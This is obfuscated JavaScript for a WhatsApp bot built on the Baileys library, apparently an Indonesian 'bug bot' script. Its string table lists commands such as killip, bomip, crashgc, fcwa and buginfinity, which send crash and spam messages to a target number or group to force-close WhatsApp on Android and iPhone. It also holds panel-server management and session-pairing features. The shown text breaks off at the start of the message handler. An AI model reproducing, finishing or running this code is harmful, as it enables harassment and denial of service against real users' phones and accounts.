/*
* 𝙊𝙬𝙚𝙣𝙨𝘿𝙚𝙫
* 𝘵𝘦𝘭𝘦: https://t.me/owenssw
* 𝘪𝘯𝘧𝘰: https://s.id/26AYH
* 𝘺𝘵: https://youtube.com/CekGem
* 𝙶𝚛𝚘𝚞𝚙: https://chat.whatsapp.com/LQBLGAalERjE1P5X3REnGC

* 🚨Di Larang Menghapus Wm Ini🚨
* #𝗛𝗮𝗿𝗴𝗮𝗶𝗹𝗮𝗵 𝗣𝗲𝗺𝗯𝘂𝗮𝘁 
*/

function _0x2a02(_0x436b0f, _0x517332) {
    const _0x3eba12 = _0x3eba();
    return _0x2a02 = function (_0x2a026d, _0x596bc4) {
        _0x2a026d = _0x2a026d - 0x105;
        let _0x267ad8 = _0x3eba12[_0x2a026d];
        return _0x267ad8;
    }, _0x2a02(_0x436b0f, _0x517332);
}
const _0x296d57 = _0x2a02;
(function (_0xd1e60b, _0x4e0dcc) {
    const _0x551498 = _0x2a02,
        _0x5ae5fc = _0xd1e60b();
    while (!![]) {
        try {
            const _0x17f8c2 = parseInt(_0x551498(0x1d5)) / 0x1 * (parseInt(_0x551498(0x1f5)) / 0x2) + -parseInt(_0x551498(0x282)) / 0x3 + parseInt(_0x551498(0x11f)) / 0x4 + parseInt(_0x551498(0x253)) / 0x5 * (-parseInt(_0x551498(0x267)) / 0x6) + parseInt(_0x551498(0x2b6)) / 0x7 + -parseInt(_0x551498(0x25c)) / 0x8 + parseInt(_0x551498(0x212)) / 0x9;
            if (_0x17f8c2 === _0x4e0dcc) break;
            else _0x5ae5fc['push'](_0x5ae5fc['shift']());
        } catch (_0x47d8c8) {
            _0x5ae5fc['push'](_0x5ae5fc['shift']());
        }
    }
}(_0x3eba, 0xb6e26), require(_0x296d57(0x1c8)));

function _0x3eba() {
    const _0xa79fa4 = ['bugemoji', ' Hari, ', 'sound61', 'Link Invalid!', 'sound64', 'sound142', 'UPI', 'bomgc', 'sound36', 'charAt', 'sound71', 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', 'stringify', 'fromObject', 'floor', 'leave', 'GET', 'sound35', ' Detik', 'groupmenu', '@g.us', 'sound46', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*BUG ANDROID*\x0a\x0a*X-NUMBER*\x0a🥀 628XXXXX\x0a🍁 628XXXXX\x0a🐉 628XXXXX\x0a🍒 628XXXXX\x0a🌷 628XXXXX\x0a\x0a*X-SPAM*\x0a🌹 <amount>\x0a🐲 <amount>\x0a🔥 <amount>\x0a🦖 <amount>\x0a🦕 <amount>\x0a\x0a _*© LECCY OFFICIAL*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', 'unwatchFile', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*BUG IPHONE*\x0aタ #killip 628XXXX\x0aタ #bomip 628XXXX\x0aタ #travass 628XXXX\x0aタ #crashin 628XXXX\x0aタ #homeip 628XXXX\x0aタ #blankip 628XXXX\x0aタ #craship 628XXXX\x0aタ #gas_ip 628XXXX\x0aタ #docip 628XXXX\x0a\x0a _*© LECCY OFFICIAL*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', './db/premium.json', '\x0aCREATED AT: \x0a', 'listjadibot', 'pagination', '- From :', 'cpanelmenu', 'magenta', 'Fitur Ini Hanya Dapat Digunakan Oleh Admin!', 'sound154', 'util', 'SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸', '\x0aUSERNAME: ', 'block', 'sound37', 'key_pltc', 'pushName', 'templateButtonReplyMessage', 'sound14', './config', 'NativeFlowMessage', 'sound102', 'imageMessage', '*Bugs Are Being Processed...*', 'Unlimited %', 'fromMe', 'sound65', '\x0a▬▭▬▭▬▭▬▭▬▭▬▭\x0a', 'splice', 'àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®', 'iphonefc', ' close', '268pqcHgf', 'selectedButtonId', 'total_pages', '\x0aADMIN: ', '\x0aPASSWORD: ', 'devNumber', '*This feature can only be used by the owner/Dev*', 'addusr', '1hit', 'sound45', 'selectedId', 'sound6', 'CHANGED_IN_CHAT', '/api/client/servers/', 'sound129', 'reinstall', '6283834558105', 'lec-i', 'videoMessage', '/api/application/users?page=', 'sound134', 'key_plta', 'sound57', ' Menit, ', 'sound160', '*We are processing your request.*', 'sound50', '*⭔Number* : @', 'sound52', 'contextInfo', ' https://chat.whatsapp.com/xxxx\x0a\x0a_*Note:*_ Jika ingin mengirim bug dengan jumlah banyak, silahkan ketik sebagai berikut ini\x0a\x0aEx: .', '*MASUKKAN CODE PAIRING DIBAWAH INI*\x0a*UNTUK MENJADI BOT SEMENTARA ✓*\x0a\x0a1. Klik titik tiga di pojok kanan atas\x0a2. Ketuk perangkat tertaut\x0a3. Ketuk tautkan perangkat\x0a4. Ketuk tautkan dengan nomor telepon saja\x0a5. Masukkan code pairing dibawah ini\x0a\x0a*Code Pairing :* `', '7114yluTnU', 'sound118', 'sound54', 'sound22', 'Bearer ', ' In the Users owners database*', 'Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!', 'stopjadibot', 'create', './lib/jadibot', 'VIP', 'sound34', 'limits', 'sound26', 'bugandroid', 'global_search_new_chat', 'sound158', '0@s.whatsapp.net', '▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\x0a', 'writeFileSync', 'buggc', 'unblock', '*⭔UserID* : ', 'groupParticipantsUpdate', 'updateBlockStatus', ' To the Premium Users Database*', 'ghcr.io/parkervcp/yolks:nodejs_21', 'detsrv', 'sound33', '24799203DpckHW', 'groupMetadata', 'documentMessage', 'sound88', 'sound48', 'sound112', 'Goodbye🖐', 'status@broadcast', 'ownerName', ', With The Amount Of Spam 10*', 'anjay', 'map', 'toUpperCase', '/unsuspend', 'yellow', 'rm -r database/jadibot/', '.mp3', '*MODE DESKRIPSI GROUP*\x0a\x0a*_Open : semua member bisa edit deskripsi grup_*\x0a\x0a*_Close: hanya admin group yang bisa edit deskripsi_*\x0a\x0a*Example:*\x0a', '*Succesfully Send Bug-ADN To @', 'homeip', 'cache', 'addsrv', 'sound161', 'Enter Group Link!\x0aEx: .join https://chat.whatsapp.com/xxxx', 'memory', 'sound1', 'delsrv', '؂ن؃؄ٽ؂ن؃؄ٽ', 'Fitur Ini Hanya Dapat Digunakan Di Dalam Group!', '/api/application/users', '/api/application/servers/', 'Belum Ada User Yang Jadibot', 'username,deskripsi,userID,ram/disk,cpu', 'FBPAY', 'xforce', 'killip', '4392524570816732', '@buyer.id', 'cta_url', 'Auto_ReadPesan', 'addapi', 'includes', 'sound104', 'sound12', 'docip', ' linkgc jumlahbug\x0a\x0aContoh:\x0a.', 'Users', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*GROUP MENU*\x0aタ #kick\x0aタ #open\x0aタ #close\x0aタ #linkgc\x0aタ #linkgrup\x0aタ #revoke\x0aタ #hidetag\x0aタ #promote\x0aタ #demote\x0aタ #setname\x0aタ #setdesc\x0aタ #editinfo\x0a\x0a _*© LECCY OFFICIAL*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', 'travagc', ' MB\x0aCPU: ', 'lol', '\x0aLANGUAGE: ', 'sound114', './servers/logo.jpg', 'sound109', 'groupAcceptInvite', 'sound85', 'extendedTextMessage', '*Success Added @', 'Update ', 'username', 'remove', 'sound90', '_Nomor Tersebut Sudah Menjadi Owners !!_', 'This feature can only be used by the owner', '35ijGsGU', 'bugandro', 'sound8', ' 628xxxx', 'Auto_Recording', 'sound127', 'root_admin', 'sound16', '\x0a● DISK: ', '8633344THAnrH', 'doca', 'sound38', 'Use ', '*Khusus Owner Leccy!*', 'Footer', 'sound122', ' https://chat.whatsapp.com/xxxx 10\x0a\x0a©leccyofc', 'sound91', 'exports', '/api/application/servers?page=', '1120020DvxLYT', '*FORMAT ADDUSR*:\x0a.addusr 628xxxx,leccy', '𝕾𝖙𝖗𝖆𝖛𝖆𝕺𝖋𝖈', '%\x0aEXPIRED: 1 BULAN\x0aDESCRIPTION: ', 'language', ', With The Amount Of Spam 25*', 'match', 'user', 'shift', 'cyan', '*Successfully Activated Self Mode!*', 'trim', 'composing', '\x0aNumber : @', 'last_name', 'buggroup', 'count', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*CPANEL MENU*\x0aタ #listapi\x0aタ #addapi\x0aタ #delusr\x0aタ #detusr\x0aタ #listusr\x0aタ #addusr\x0aタ #listsrv\x0aタ #detsrv\x0aタ #delsrv\x0aタ #addsrv\x0aタ #bansrv\x0aタ #unbansrv\x0aタ #reinstall\x0a\x0a _*© LECCY OFFICIAL*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', 'sound86', 'promote', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*OWNER MENU*\x0aタ #join\x0aタ #restart\x0aタ #leave\x0aタ #unblock\x0aタ #block\x0aタ #shutdown\x0aタ #unmute\x0aタ #mute\x0aタ #runtime\x0a\x0a _*© LECCY OFFICIAL*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', 'message', 'sound73', '*Succesfully Send ', '_Gagal Menghapus Dari Database, Nomor Tersebut Bukan Owners Bot!!_', 'push', '/reinstall', '3989322VHljrn', 'locked', 'sound98', 'application/json', 'domain', '6283834558105@s.whatsapp.net', '*Congratulations users, you can now use owners features*', 'Body', 'wargc', 'subject', '_*LIST USER PREMIUM*_\x0a*Total User :* ', '*\x0aOwners : *', '_Enter A Valid And Registered Number On WhatsApp!!_', 'Jumlah Wajib Angka!!', ' number\x0aExample ', 'sound149', 'POST', 'crashgc', 'then', 'sound76', '/api/application/users/', 'sound74', '*Maaf, Kamu Tidak Terdaftar Jadibot!*', '*The number is not registered in the WhatsApp application.*', '\x0aNAME: ', ', With The Amount Of Spam 20*', 'meta', ' 628xxxxx', '/resources', ' Jam, ', '\x0a● MEMORY: ', 'log', 'description', 'white', 'ê¦¾', 'sound40', 'groupUpdateSubject', 'sound43', 'onWhatsApp', 'readMessages', '/api/client/account/api-keys', 'sound30', '*succesfully restart session ✓*', 'key', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*BUG CRASH-INFINITY*\x0a\x0a*X-ANDROID*\x0aタ #androidfc 628XXXX,5\x0aタ #bugandro 628XXXX,5\x0aタ #fcwa 628XXXX,5\x0aタ #doca 628XXXX,5\x0aタ #lec-a 628XXXX,5\x0aタ #kill_adn 628XXXX,5\x0a\x0a*X-IPHONE*\x0aタ #bugipong 628XXXX,5\x0aタ #iphonefc 628XXXX,5\x0aタ #fcwi 628XXXX,5\x0aタ #doci 628XXXX,5\x0aタ #lec-i 628XXXX,5\x0aタ #kill_ipn 628XXXX,5\x0a\x0a _*© LECCY OFFICIAL*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0aBotname : *', '*SUKSES DELETE USER ', 'sound15', '▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\x0a*LIST USERS PANEL*\x0a□ Nama Host : ', 'redBright', 'virdokgc', 'Unlimited MB', '2037630TKbEKT', '*\x0aNumber : @', '@whiskeysockets/baileys', ' MB\x0aDISK: ', '\x0aEXPIRED: 1 BULAN\x0aCREATED AT: \x0a', 'buginfinity', '\x0a\x0a*SEND ACCOUNT* @', 'audio/mp3', 'sound82', 'buttonsResponseMessage', 'kill_ipn', 'selectedRowId', 'node-fetch', 'test', 'bugipong', 'join', '- Message :', 'slice', 'murbugmenu', 'repeat', 'ID nya mana?', 'greenBright', '*Maaf, Nomor itu Tidak Terdaftar Jadibot!*', 'sound51', 'sound44', 'Bye Everyone.', 'DEFAULT', 'CHAT_SETTING', 'json', 'sound24', 'trolifc', 'sound103', 'created_at', '/suspend', 'uptime', 'ownermenu', 'Type_Menu', 'nama_host', 'parse', 'caption', 'eggID', 'sound28', '\x0aTYPE: ', 'data', 'sound151', 'sound21', 'remoteJid', 'participant', 'sound63', '\x0aCREATED AT: \x0a ', '\x0a□ Page : ', 'recording', 'toLowerCase', 'soundmenu', 'sound148', '6283854543070', 'sound11', '*succesfully delete session* @', 'Reply targetnya!', '@s.whatsapp.net', 'parse-ms', 'sound27', 'sound62', '\x0a● DESKRIPSI: ', 'sound159', '\x0aPrefix : *MULTI*\x0a▭▬▭▬▭▬▭▬▭▬▭▬\x0a*===( LIST-MENU )=====*\x0a● .jadibotmenu\x0a● .ownermenu\x0a● .groupmenu\x0a● .murbugmenu\x0a● .cpanelmenu\x0a● .soundmenu\x0a▭▬▭▬▭▬▭▬▭▬▭▬\x0a*===( BUG-MENU )=====*\x0a● .buginfinity\x0a● .bugemoji\x0a● .buggroup\x0a● .bugiphone\x0a● .bugandroid\x0a▭▬▭▬▭▬▭▬▭▬▭▬\x0a_*CREDITS © LECCYOFC*_\x0a*POWERED BY @', 'unlimited', 'sound69', '\x0a▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬', ', With The Amount Of Spam ', 'blankip', ' 628xxxx,1', 'bugiphone', 'linkgc', '𝗕𝗘𝗥𝗜𝗞𝗨𝗧 𝗗𝗘𝗧𝗔𝗜𝗟 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔️️\x0a\x0aID: ', 'sound147', 'Teks Deskripsi Nya Mana?\x0a\x0aEx:\x0a.setdesc teks_deskripsi', 'sound68', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*JADIBOT MENU*\x0aタ #jadibot\x0aタ #stopjadibot\x0aタ #del-sesi\x0aタ #resetjadibot\x0aタ #listjadibot\x0a\x0a _*© LECCY OFFICIAL*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', 'sound7', ' To @', 'npm', 'sound130', '*Succesfully Send Pairing Code* @', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*MURBUG MENU*\x0aタ #listown\x0aタ #addown\x0aタ #delown\x0aタ #addprem\x0aタ #delprem\x0aタ #listprem\x0a\x0a _*© LECCY OFFICIAL*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', 'green', 'bansrv', 'bgBlack', 'androidfc', ' In the Users Premium database*', 'sound143', 'menu', 'fcwi', '𝕾𝖙𝖗𝖆𝖛𝖆-𝕭𝖚𝖌', 'sound141', 'jadibotmenu', 'InteractiveMessage', 'name', 'sound84', 'sound53', 'sound150', 'editinfo', 'exit', 'setname', 'gaslec', 'indexOf', 'messageContextInfo', 'sound117', 'SUKSES DELETE SERVER ', 'sound97', '𝕾𝖙𝖗𝖆𝖛𝖆 𝕭𝖚𝖌', 'travas', 'sound93', '*mohon maaf* @', 'revoke', 'conversation', 'unmute', 'sound139', 'sound42', '𝖘𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌', 'VVIP', 'filter', 'kill_adn', '*Succesfully Send Bug-IOS To @', 'sound72', 'crashfc', 'sound113', '*Format :*\x0a', 'sound20', 'whatsapp.com', 'crashin', 'length', '{ display_text : \'𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌\', url : , merchant_url :  }', 'audio/mp4', 'infinity', 'https://chat.whatsapp.com/', 'quotedMessage', 'sound120', 'sound94', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*SOUND MENU*\x0aタ #sound1\x0aタ #sound2\x0aタ #sound3\x0aタ #sound4\x0aタ #sound5\x0aタ #sound6\x0aタ #sound7\x0aタ #sound8\x0aタ #sound9\x0aタ #sound10\x0aタ #sound11\x0aタ #sound12\x0aタ #sound13\x0aタ #sound14\x0aタ #sound15\x0aタ #sound16\x0aタ #sound17\x0aタ #sound18\x0aタ #sound19\x0aタ #sound20\x0a\x0a _*© LECCY OFFICIAL*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', 'lec-a', 'replace', 'npm start', 'sound32', '🌶️', '1859572RInooz', 'relayMessage', '*The bot has been in self mode before*', ' USER DETAILS\x0a\x0aID: ', 'sound67', 'resetjadibot', 'current_page', 'sound126', 'email', '\x0a ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬', 'open', '{ display_text : \" \", url : , merchant_url : \" \"}', 'sound121', 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½', 'sound47', 'sendPresenceUpdate', 'sendTextWithMentions', 'sound18', 'not_announcement', 'hidetag', 'sound75', 'sound123', 'sound140', 'setsubject', 'addprem', 'listusr', '1234567890', './lib/myfunc.js', ' SERVER DETAILS\x0a\x0a● ID: ', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*BUG GROUP*\x0aタ #wargc *linkgrup*\x0aタ #xlecgc *linkgrup*\x0aタ #buggc *linkgrup*\x0aタ #crashgc *linkgrup*\x0aタ #bomgc *linkgrup*\x0aタ #travagc *linkgrup*\x0aタ #virdokgc *linkgrup*\x0a\x0a _*© LECCY OFFICIAL*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', 'sendMessage', 'locID', '*Deleting Success @', '\x0a□ Total Server : ', 'botName', 'DELETE', '*there are not Premium Users in the database*', 'sound5', 'sound9', '\x0a▬▭▬▭▬▭▬▭▬▭▬▭▬\x0a', 'sound156', 'close', 'split', 'bomip', 'sound157', 'readFileSync', 'listprem', 'sound81', 'participants', '/api/application/nests/5/eggs/', '`\x0a\x0a*Note:*\x0a_Code dapat expired kapan saja._\x0a_Jika code error silahkan ketik_ ⇩\x0a\x0a========[  !stopjadibot  ]========', 'sound124', 'sound10', '\x0a===========================================\x0a', 'sound152', 'sound39', '\x0aEMAIL: ', ',ram/disk,cpu', 'listsrv', './database/jadibot/', 'whatsapp', 'sound4', '𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕', '*succesfully delete session ✓*', 'black', 'singleSelectReply', 'kick', 'sound49', 'attributes', 'errors', 'runtime', 'sound99', 'listapi', 'Maaf This feature can only be used by the owner Lexxy', ' ^_^\x0a*session users masih terdaftar.*\x0a\x0a*silahkan ketik* .stopjadibot\x0a*untuk menghapus session ✓*', 'catch', './db/owners.json', '*OPENED* The group is opened by admin\x0aNow members can send messages', '\x0a\x0acara upload script strava\x0ake panel dan cara install\x0anode modules manual:\x0ahttps://shorturl.at/HkUQE\x0a\x0a*NOTE*\x0aHarap Login Akun Panel Setelah \x0a1Menit Dibuat/Dikirim Dari Bot\x0a', 'resolve', 'cpu', 'Server nomor berapa yang mau di hapus?\x0aContoh: delsrv 1', '\x0aMEMORY: ', 'Jumlah wajib angka!!', 'sound101', 'https://github.com/Lexxy24/MusicTikTok-Api/raw/master/tiktokmusic/', 'now', 'text', 'sound87', 'sound137', 'doci', 'format', 'sound96', '𝗦𝗨𝗞𝗦𝗘𝗦 𝗠𝗘𝗠𝗕𝗨𝗔𝗧 𝗦𝗘𝗥𝗩𝗘𝗥\x0a\x0aID: ', 'endsWith', 'sound95', 'sound116', '\x0a□ Total Users : ', 'sound83', 'gas_ip', 'sound92', 'detail', 'chalk', 'fcwa', 'watchFile', 'sound131', 'groupSettingUpdate', '1679959486', 'Message', 'existsSync', 'disk', 'sound25', 'listResponseMessage', 'INITIATED_BY_ME', 'sound136', 'Users : ', 'sound107', 'detusr', 'mute', 'sound145', 'sound106', 'unbansrv', 'This feature can only be used by the owner Bot', 'addown', 'sound17', 'codepairing'];
    _0x3eba = function () {
        return _0xa79fa4;
    };
    return _0x3eba();
}
const {
    delay,
    downloadContentFromMessage,
    makeInMemoryStore,
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType
} = require(_0x296d57(0x2b8)), {
    isUrl,
    sleep,
    await,
    getBuffer,
    getGroupAdmins,
    fetchJson
} = require(_0x296d57(0x13a)), fs = require('fs'), axios = require('axios'), util = require(_0x296d57(0x1bf)), chalk = require(_0x296d57(0x185)), fetch = require(_0x296d57(0x2c2)), ms = require(_0x296d57(0x2f2)), {
    exec,
    spawn,
    execSync
} = require('child_process');
ownerNamee = global[_0x296d57(0x21a)], botNamee = global[_0x296d57(0x141)], Leccy_Auto_Typing = global['Auto_Typing'], Leccy_Auto_Recording = global[_0x296d57(0x257)], Leccy_Auto_RecordType = global['Auto_RecordType'], Leccy_Auto_ReadPesan = global[_0x296d57(0x239)], global['locID'] = '1', global[_0x296d57(0x2de)] = '15';
let premium = JSON[_0x296d57(0x2dc)](fs[_0x296d57(0x14c)](_0x296d57(0x1b6))),
    ownerss = JSON[_0x296d57(0x2dc)](fs[_0x296d57(0x14c)]('./db/owners.json')),
    treeimg = fs[_0x296d57(0x14c)](_0x296d57(0x247));
mute_bot = ![], module[_0x296d57(0x265)] = async (_0x23b255, _0x38267e, _0x59b581) => {
    const _0x1b775d = _0x296d57;
    try {
        const {
            fromMe: _0x426611,
            isBaileys: _0x200f39,
            isQuotedMsg: _0x543ca8,
            quotedMsg: _0x333753,
            mentioned: _0x9c8669
        } = _0x38267e;
        if (_0x38267e[_0x1b775d(0x2ad)] && _0x38267e['key'][_0x1b775d(0x2e4)] === _0x1b775d(0x219)) return;
        const _0x12ce2b = getContentType(_0x38267e[_0x1b775d(0x27c)]),
            _0x54fd3e = JSON[_0x1b775d(0x1a9)](_0x38267e['message']),
            _0x42fa35 = _0x38267e[_0x1b775d(0x2ad)][_0x1b775d(0x2e4)],
            _0x2ac92d = _0x12ce2b == _0x1b775d(0x24b) && _0x38267e['message'][_0x1b775d(0x24b)][_0x1b775d(0x1f2)] != null ? _0x38267e['message']['extendedTextMessage'][_0x1b775d(0x1f2)][_0x1b775d(0x116)] || [] : [],
            _0x53090e = _0x12ce2b === 'conversation' && _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x329)] ? _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x329)] : _0x12ce2b == _0x1b775d(0x1cb) && _0x38267e['message'][_0x1b775d(0x1cb)][_0x1b775d(0x2dd)] ? _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x1cb)][_0x1b775d(0x2dd)] : _0x12ce2b == _0x1b775d(0x214) && _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x214)][_0x1b775d(0x2dd)] ? _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x214)][_0x1b775d(0x2dd)] : _0x12ce2b == _0x1b775d(0x1e7) && _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x1e7)][_0x1b775d(0x2dd)] ? _0x38267e[_0x1b775d(0x27c)]['videoMessage']['caption'] : _0x12ce2b == 'extendedTextMessage' && _0x38267e['message']['extendedTextMessage'][_0x1b775d(0x176)] ? _0x38267e['message'][_0x1b775d(0x24b)][_0x1b775d(0x176)] : _0x12ce2b == _0x1b775d(0x2bf) && _0x38267e[_0x1b775d(0x27c)]['buttonsResponseMessage'][_0x1b775d(0x1d6)] ? _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x2bf)][_0x1b775d(0x1d6)] : _0x12ce2b == _0x1b775d(0x1c6) && _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x1c6)][_0x1b775d(0x1df)] ? _0x38267e['message'][_0x1b775d(0x1c6)][_0x1b775d(0x1df)] : '',
            _0x4560bc = _0x12ce2b === _0x1b775d(0x329) && _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x329)] ? _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x329)] : _0x12ce2b === _0x1b775d(0x1cb) && _0x38267e[_0x1b775d(0x27c)]['imageMessage'][_0x1b775d(0x2dd)] ? _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x1cb)]['caption'] : _0x12ce2b === _0x1b775d(0x1e7) && _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x1e7)][_0x1b775d(0x2dd)] ? _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x1e7)]['caption'] : _0x12ce2b === 'extendedTextMessage' && _0x38267e['message'][_0x1b775d(0x24b)]['text'] ? _0x38267e['message']['extendedTextMessage']['text'] : _0x12ce2b === 'buttonsResponseMessage' && _0x333753[_0x1b775d(0x1ce)] && _0x38267e['message']['buttonsResponseMessage'][_0x1b775d(0x1d6)] ? _0x38267e['message'][_0x1b775d(0x2bf)][_0x1b775d(0x1d6)] : _0x12ce2b === 'templateButtonReplyMessage' && _0x333753[_0x1b775d(0x1ce)] && _0x38267e[_0x1b775d(0x27c)]['templateButtonReplyMessage'][_0x1b775d(0x1df)] ? _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x1c6)][_0x1b775d(0x1df)] : _0x12ce2b === _0x1b775d(0x320) ? _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x2bf)]?. [_0x1b775d(0x1d6)] || _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x18f)]?. [_0x1b775d(0x160)][_0x1b775d(0x2c1)] : _0x12ce2b == _0x1b775d(0x18f) && _0x333753['fromMe'] && _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x18f)][_0x1b775d(0x160)]['selectedRowId'] ? _0x38267e[_0x1b775d(0x27c)][_0x1b775d(0x18f)]['singleSelectReply'][_0x1b775d(0x2c1)] : '',
            _0x185059 = /^[°•π÷●¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/ [_0x1b775d(0x2c3)](_0x53090e) ? _0x53090e[_0x1b775d(0x26d)](/^[°•π÷●¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.',
            _0x2818bf = _0x53090e[_0x1b775d(0x11b)](_0x185059, '')[_0x1b775d(0x272)]()[_0x1b775d(0x149)](/ +/)[_0x1b775d(0x26f)]()[_0x1b775d(0x2ea)](),
            _0x3bedf8 = _0x53090e['trim']()['split'](/ +/)[_0x1b775d(0x2c7)](0x1),
            _0x3b0869 = _0x3bedf8['join'](' '),
            _0x3b439e = q = _0x3bedf8[_0x1b775d(0x2c5)](' '),
            _0x4ae346 = _0x42fa35[_0x1b775d(0x17d)](_0x1b775d(0x1b1)),
            _0x460352 = _0x23b255[_0x1b775d(0x26e)]['id'][_0x1b775d(0x149)](':')[0x0],
            _0x2d4ede = _0x460352 + _0x1b775d(0x2f1),
            _0x5e0c1d = _0x38267e[_0x1b775d(0x2ad)]['fromMe'] ? _0x23b255[_0x1b775d(0x26e)]['id'][_0x1b775d(0x149)](':')[0x0] + _0x1b775d(0x2f1) || _0x23b255['user']['id'] : _0x38267e['key']['participant'] || _0x38267e[_0x1b775d(0x2ad)][_0x1b775d(0x2e4)],
            _0x518b7a = _0x5e0c1d[_0x1b775d(0x149)]('@')[0x0],
            _0x13e21c = _0x38267e['pushName'] || '' + _0x518b7a,
            _0x3424fb = _0x460352['includes'](_0x518b7a),
            _0x585723 = global['devNumber']['includes'](_0x518b7a),
            _0x1eaf88 = [global[_0x1b775d(0x1da)], ...premium][_0x1b775d(0x23b)](_0x518b7a),
            _0x5290c9 = ownerss[_0x1b775d(0x23b)](_0x518b7a),
            _0x3e6ad6 = _0x4ae346 ? await _0x23b255[_0x1b775d(0x213)](_0x42fa35) : '',
            _0x39e19d = _0x4ae346 ? _0x3e6ad6[_0x1b775d(0x28b)] : '',
            _0x1d920d = _0x4ae346 ? _0x3e6ad6['id'] : '',
            _0x28b967 = _0x4ae346 ? _0x3e6ad6[_0x1b775d(0x14f)] : '',
            _0x117527 = _0x4ae346 ? getGroupAdmins(_0x28b967) : '',
            _0xcf285e = _0x117527['includes'](_0x460352 + _0x1b775d(0x2f1)) || ![],
            _0xa7e0c0 = _0x117527[_0x1b775d(0x23b)](_0x5e0c1d) || ![],
            _0x2fcec4 = function (_0x2f4a85) {
                const _0x22ceda = _0x1b775d;
                var _0x2f4a85 = Number(_0x2f4a85),
                    _0x3c8caa = Math[_0x22ceda(0x1ab)](_0x2f4a85 / (0xe10 * 0x18)),
                    _0x2082fe = Math[_0x22ceda(0x1ab)](_0x2f4a85 % (0xe10 * 0x18) / 0xe10),
                    _0x4e63a5 = Math[_0x22ceda(0x1ab)](_0x2f4a85 % 0xe10 / 0x3c),
                    _0x5b2e06 = Math[_0x22ceda(0x1ab)](_0x2f4a85 % 0x3c),
                    _0x3cdff4 = _0x3c8caa > 0x0 ? _0x3c8caa + (_0x3c8caa == 0x1 ? _0x22ceda(0x19e) : ' Hari, ') : '',
                    _0x638e7b = _0x2082fe > 0x0 ? _0x2082fe + (_0x2082fe == 0x1 ? _0x22ceda(0x29f) : _0x22ceda(0x29f)) : '',
                    _0x15c3ca = _0x4e63a5 > 0x0 ? _0x4e63a5 + (_0x4e63a5 == 0x1 ? _0x22ceda(0x1ec) : _0x22ceda(0x1ec)) : '',
                    _0x1fc4ce = _0x5b2e06 > 0x0 ? _0x5b2e06 + (_0x5b2e06 == 0x1 ? _0x22ceda(0x1af) : _0x22ceda(0x1af)) : '';
                return _0x3cdff4 + _0x638e7b + _0x15c3ca + _0x1fc4ce;
            },
            _0x4ea672 = async _0x327fa3 => {
                const _0x36f16d = _0x1b775d;
                return JSON[_0x36f16d(0x1a9)](_0x327fa3, null, 0x2);
            }, _0x404955 = {
                'key': {
                    'fromMe': ![],
                    'participant': '0@s.whatsapp.net',
                    'remoteJid': _0x1b775d(0x219)
                },
                'message': {
                    'extendedTextMessage': {
                        'text': '' + _0x2fcec4(process[_0x1b775d(0x2d8)]())
                    }
                }
            }, _0x25b16a = async _0x1a96fd => {
                await _0x23b255['sendMessage'](_0x42fa35, {
                    'text': _0x1a96fd
                }, {
                    'quoted': _0x38267e
                });
            }, _0x13a24e = async _0x5c003c => {
                const _0x98e48b = _0x1b775d;
